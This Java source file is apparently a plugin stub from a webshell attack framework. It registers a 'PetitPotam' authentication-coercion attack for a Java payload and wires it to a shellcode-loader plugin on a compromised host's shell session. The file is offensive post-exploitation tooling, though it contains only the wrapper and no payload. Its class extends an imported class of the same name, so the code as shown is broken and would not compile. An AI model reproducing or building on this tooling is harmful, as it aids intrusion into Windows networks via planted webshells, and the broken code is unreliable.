package shells.plugins.java;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.PetitPotam;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "PetitPotam", DisplayName = "PetitPotam")
public class PetitPotam extends PetitPotam {
  protected ShellcodeLoader getShellcodeLoader() {
    return (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
  }
}
